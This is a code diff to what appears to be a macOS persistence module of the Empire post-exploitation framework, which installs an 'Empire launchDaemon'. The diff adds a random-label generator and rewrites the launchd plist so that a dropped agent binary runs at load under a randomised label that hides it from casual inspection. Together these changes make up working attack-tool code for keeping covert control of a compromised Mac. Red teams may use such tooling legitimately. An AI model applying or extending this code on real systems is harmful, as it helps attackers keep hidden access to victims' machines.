@@ -10,7 +10,7 @@ class Module:
             'Name': 'LaunchDaemon',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior', '@malcomvetter'],
+            'Author': ['@xorrior', '@malcomvetter', '@h1ghtopfade', 'jrm'],
 
             # more verbose multi-line description of the module
             'Description': ('Installs an Empire launchDaemon.'),
@@ -108,6 +108,11 @@ import subprocess
 import sys
 import base64
 import os
+import string
+import random
+
+def label_generator(size=6, chars=string.ascii_uppercase + string.digits):
+        return ''.join(random.choice(chars) for _ in range(size))
 
 my_env = os.environ.copy()
 username = my_env["USER"]
@@ -118,23 +123,31 @@ daemonPath = "%s"
 daemonName = "%s"
 fullPath = "/Users/" + username + "/" + daemonPath
 
-plist = \"\"\"
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
+plist = \"\"\"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>Label</key>
-    <string>||daemonName||</string>
-    <key>Program</key>
-    <string>||fullPath||||daemonName||</string>
-    <key>RunAtLoad</key>
-    <true/>
+        <key>KeepAlive</key>
+        <false/>
+        <key>Label</key>
+        <string>||label||</string>
+        <key>Program</key>
+        <string>||fullPath||||daemonName||</string>
+        <key>ProgramArguments</key>
+        <array>
+                <string>||fullPath||||daemonName||</string>
+        </array>
+        <key>LaunchOnlyOnce</key>
+        <true/>
+        <key>RunAtLoad</key>
+        <true/>
 </dict>
-</plist>
-\"\"\"
+</plist>\"\"\"
+
 
 plist = plist.replace("||daemonName||", daemonName)
 plist = plist.replace("||fullPath||", fullPath)
+plist = plist.replace("||label||", label_generator(15))
 
 
 if not os.path.exists(fullPath):
